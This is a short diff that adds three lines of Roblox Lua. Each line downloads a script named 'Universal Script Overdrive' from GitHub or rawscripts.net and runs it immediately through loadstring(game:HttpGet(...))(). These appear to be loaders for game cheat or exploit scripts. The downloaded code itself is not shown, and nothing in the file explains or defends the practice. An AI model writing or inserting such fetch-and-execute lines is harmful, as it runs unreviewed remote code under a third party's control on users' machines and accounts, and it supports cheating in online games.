@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Universal-Script/OD-H/refs/heads/main/Overdrive"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Overdrive-H-21567"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Overdrive-H-Lite-21568"))()
